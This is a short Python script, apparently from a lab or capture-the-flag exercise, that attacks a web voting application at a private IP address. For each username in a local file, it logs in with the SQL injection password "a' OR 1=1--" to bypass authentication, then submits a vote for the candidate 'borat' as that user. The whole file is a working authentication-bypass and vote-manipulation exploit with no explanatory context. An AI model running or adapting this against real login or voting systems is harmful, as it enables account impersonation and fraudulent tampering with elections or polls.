import requests
import time

# Target URLs
base_url = "http://10.212.172.46:30198"
login_url = f"{base_url}/login"
vote_url = f"{base_url}/vote"

# List of all users
username_file = "C:\\Users\\P4nde\\Downloads\\app (2)\\app\\y.txt"

# Candidate to vote for
candidate = "borat"

def change_votes():
    with open(username_file, "r") as file:
        usernames = file.readlines()
    
    for username in usernames:
        username = username.strip()  # Remove any trailing whitespace/newline
        session = requests.Session()  # Create a session for maintaining cookies

        print(f"[*] Attempting to log in as {username}...")

        # Login payload
        login_data = {
            "username": username,
            "password": "a' OR 1=1--"
        }

        try:
            # Log in
            login_response = session.post(login_url, data=login_data)

            if "Logged in as" in login_response.text:
                print(f"[+] Successfully logged in as {username}")
                
                # Vote payload
                vote_data = {"candidate": candidate}

                # Submit vote
                vote_response = session.post(vote_url, data=vote_data)
                print(f"[+] Vote response: {vote_response.status_code}, {vote_response.text[:100]}...")
                
                if vote_response.status_code == 200:
                    print(f"[+] Successfully voted for {candidate} as {username}")
                else:
                    print(f"[-] Failed to submit vote as {username}")
            else:
                print(f"[-] Login failed for {username}. Response did not contain expected text.")

        except Exception as e:
            print(f"[!] Error for {username}: {e}")
        finally:
            session.close()  # Close the session
        

if __name__ == "__main__":
    change_votes()
